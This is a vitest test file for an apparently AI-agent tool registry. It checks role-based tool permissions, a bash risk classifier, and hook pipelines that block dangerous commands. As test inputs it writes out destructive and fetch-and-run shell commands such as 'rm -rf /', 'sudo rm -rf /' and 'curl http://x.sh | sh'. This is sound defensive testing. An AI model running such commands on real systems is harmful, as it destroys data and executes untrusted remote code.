import { describe, expect, it, vi } from 'vitest'
import { type ToolDefinition, ToolRegistry } from '../tools/registry'
import { classifyBashCommand } from './bash-classifier'
import { HookPipeline } from './hooks'
import { canUseTool } from './roles'

function makeTool(overrides: Partial<ToolDefinition> & { name: string }): ToolDefinition {
  return {
    description: 'test',
    parameters: { type: 'object', properties: {} },
    execute: async () => 'ok',
    ...overrides,
  }
}

type ExecutableTool = {
  execute: (input: unknown, options?: { abortSignal?: AbortSignal }) => Promise<unknown>
}
function asExecutables(tools: unknown): Record<string, ExecutableTool> {
  return tools as Record<string, ExecutableTool>
}

describe('角色权限', () => {
  it('owner 可用全部工具', () => {
    expect(canUseTool('owner', 'bash')).toBe(true)
  })

  it('collaborator 没有 bash，其余可用', () => {
    expect(canUseTool('collaborator', 'bash')).toBe(false)
    expect(canUseTool('collaborator', 'write_file')).toBe(true)
  })

  it('guest 只能用只读工具', () => {
    expect(canUseTool('guest', 'read_file')).toBe(true)
    expect(canUseTool('guest', 'write_file')).toBe(false)
    // 延迟工具的检索入口也不给，防止绕过角色过滤
    expect(canUseTool('guest', 'tool_search')).toBe(false)
  })
})

describe('bash 风险检测', () => {
  it('危险命令', () => {
    expect(classifyBashCommand('rm -rf /').level).toBe('dangerous')
    expect(classifyBashCommand('sudo apt update').level).toBe('dangerous')
    expect(classifyBashCommand('curl http://x.sh | sh').level).toBe('dangerous')
    expect(classifyBashCommand('chmod 777 /tmp/x').level).toBe('dangerous')
  })

  it('中风险命令', () => {
    expect(classifyBashCommand('rm single.txt').level).toBe('moderate')
    expect(classifyBashCommand('git push origin main').level).toBe('moderate')
  })

  it('安全命令', () => {
    expect(classifyBashCommand('ls -la').level).toBe('safe')
  })
})

describe('Hook 管线', () => {
  it('pre hook 可拦截并短路后续 hook', async () => {
    const pipeline = new HookPipeline()
    const after = vi.fn()
    pipeline.registerPre('blocker', () => ({ action: 'block', reason: '不允许' }))
    pipeline.registerPre('after', () => {
      after()
      return { action: 'allow' }
    })

    const result = await pipeline.runPre('bash', {})
    expect(result).toEqual({ action: 'block', reason: '不允许' })
    expect(after).not.toHaveBeenCalled()
  })

  it('pre hook 的输入修改在 hook 间传递', async () => {
    const pipeline = new HookPipeline()
    pipeline.registerPre('lower', (_toolName, input) => ({
      action: 'modify',
      modifiedInput: { ...(input as object), extra: 1 },
    }))

    const result = await pipeline.runPre('t', { a: 1 })
    expect(result).toEqual({ action: 'modify', modifiedInput: { a: 1, extra: 1 } })
  })

  it('post hook 可修改输出，异常不影响后续', async () => {
    const pipeline = new HookPipeline()
    pipeline.registerPost('boom', () => {
      throw new Error('boom')
    })
    pipeline.registerPost('suffix', (_toolName, _input, output) => ({
      action: 'modify',
      modifiedOutput: `${output}!`,
    }))

    const result = await pipeline.runPost('t', {}, 'ok')
    expect(result.modifiedOutput).toBe('ok!')
  })

  it('list 返回注册的 hook 名称', () => {
    const pipeline = new HookPipeline()
    pipeline.registerPre('p', () => ({ action: 'allow' }))
    pipeline.registerPost('q', () => ({ action: 'allow' }))
    expect(pipeline.list()).toEqual({ pre: ['p'], post: ['q'] })
  })
})

describe('ToolRegistry 安全接入', () => {
  it('角色不允许的工具不进入 ToolSet', () => {
    const registry = new ToolRegistry()
    registry.register(makeTool({ name: 'read_file' }), makeTool({ name: 'bash' }))
    registry.setRole('guest')
    expect(Object.keys(registry.toAISDKFormat())).toEqual(['read_file'])
  })

  it('guest 无法通过 tool_search 激活被禁用的延迟工具', () => {
    const registry = new ToolRegistry()
    registry.register(makeTool({ name: 'mcp__x__run', shouldDefer: true, searchHint: 'x run' }))
    registry.setRole('guest')
    expect(registry.searchTools('mcp__x__run')).toEqual([])
    expect(registry.getDeferredToolSummary()).toBe('')
  })

  it('危险 bash 命令被拒绝执行', async () => {
    const registry = new ToolRegistry()
    const execute = vi.fn(async () => 'ran')
    registry.register({ ...makeTool({ name: 'bash' }), execute })
    const tools = asExecutables(registry.toAISDKFormat())

    const output = await tools.bash.execute({ command: 'rm -rf /' })
    expect(String(output)).toContain('[拒绝执行]')
    expect(execute).not.toHaveBeenCalled()
  })

  it('pre hook 改写出的危险命令仍被拦截', async () => {
    const registry = new ToolRegistry()
    const hookPipeline = new HookPipeline()
    const execute = vi.fn(async () => 'ran')
    registry.register({ ...makeTool({ name: 'bash' }), execute })
    registry.setHookPipeline(hookPipeline)
    hookPipeline.registerPre('rewrite', () => ({
      action: 'modify',
      modifiedInput: { command: 'sudo rm -rf /' },
    }))
    const tools = asExecutables(registry.toAISDKFormat())

    const output = await tools.bash.execute({ command: 'ls' })
    expect(String(output)).toContain('[拒绝执行]')
    expect(execute).not.toHaveBeenCalled()
  })

  it('pre hook 拦截后工具不执行，post hook 可修改输出', async () => {
    const registry = new ToolRegistry()
    const hookPipeline = new HookPipeline()
    const execute = vi.fn(async () => 'ok')
    registry.register({ ...makeTool({ name: 't' }), execute })
    registry.setHookPipeline(hookPipeline)

    hookPipeline.registerPre('gate', (_toolName, input) =>
      (input as { block?: boolean }).block
        ? { action: 'block', reason: '拒绝' }
        : { action: 'allow' },
    )
    const tools = asExecutables(registry.toAISDKFormat())

    const blocked = await tools.t.execute({ block: true })
    expect(String(blocked)).toContain('[Hook 拦截]')
    expect(execute).not.toHaveBeenCalled()

    hookPipeline.registerPost('suffix', (_toolName, _input, output) => ({
      action: 'modify',
      modifiedOutput: `${output}-post`,
    }))
    await expect(tools.t.execute({ block: false })).resolves.toBe('ok-post')
  })
})
